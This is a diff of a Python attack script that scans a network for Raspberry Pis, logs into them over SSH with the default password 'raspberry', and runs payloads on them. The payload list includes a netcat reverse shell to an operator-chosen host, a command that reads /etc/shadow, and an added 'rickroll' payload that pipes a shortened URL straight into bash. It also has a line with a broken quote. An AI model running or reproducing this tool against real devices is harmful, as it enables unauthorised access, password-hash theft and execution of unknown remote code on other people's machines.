@@ -9,9 +9,10 @@ sub_color='blue'
 line_color='red'
 
 parser = argparse.ArgumentParser()
+parser.add_argument('--list', action='store_true',
+                   help='List avalible payloads')
 parser.add_argument('--no-scan', dest='no_scan', action='store_true',
                     help='Disable ARP scanning')
-
 parser.add_argument('-r', dest='ip_range', type=str, default='--localnet',
                     help='IP range to scan')
 parser.add_argument('-f', dest='ip_list', type=str, default='./scan/RPI_list',
@@ -20,15 +21,13 @@ parser.add_argument('-f', dest='ip_list', type=str, default='./scan/RPI_list',
 parser.add_argument('-c', dest='creds', type=str, default='raspberry',
                     help='Password to use when ssh\'ing')
 
-parser.add_argument('--list', action='store_true',
-                   help='List avalible payloads')
 parser.add_argument('--payload', type=str, default='whoami',
-		    help='(Name of or raw) Payload [ex. whoami or reverse_shell]')
+		    help='(Name of, or raw) Payload [ex. reverse_shell or \'whoami\']')
 
 parser.add_argument('-H', dest='host', type=str,
-                    help='(If using reverse_shell payload) Host for reverse shell')
+                    help='(If using nc reverse_shell payload) Host for reverse shell')
 parser.add_argument('-P', dest='port', type=str,
-                    help='(If using reverse_shell payload) Port for reverse shell')
+                    help='(If using nc reverse_shell payload) Port for reverse shell')
 
 parser.add_argument('--safe', action='store_true',
 		   help='Print sshpass command, but don\'t execute it')
@@ -42,10 +41,11 @@ payloads={
 'reverse_shell':'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '+str(args.host)+' '+str(args.port)+' >/tmp/fC',
 'apt_update':'sudo apt update && sudo apt -y upgrade',
 'raincow_install':'sudo apt -y install fortune cowsay lolcat',
-'raincow':'fortune | cowsay | lolcat',
 'gitpip':'sudo apt -y install git python-pip',
 'shadow':'sudo cat /etc/shadow',
 'motd':'echo "CHANGE YOUR PASSWORD" > /etc/motd',
+'raincow_bashrc':'sudo echo "fortune | cowsay | lolcat >> ~/.bashrc',
+'rickroll':'curl -s -L http://bit.ly/10hA8iC | bash'
 }
 
 if args.payload in payloads:
@@ -71,8 +71,6 @@ def scan():
                 cprint('\nLocated '+ str(sum(1 for line in open ('./scan/RPI_list'))) + ' Raspi\'s', 'yellow')
 
 def RPI():
-	if args.safe:
-        	raw_input('\nPress enter to continue')
 	cprint('\nLoaded '+ str(sum(1 for line in open (args.ip_list))) + ' IP\'s\n\n', 'yellow')
 
         list = args.ip_list
@@ -113,4 +111,3 @@ if args.list:
 else:
 	scan()
        	RPI()
-
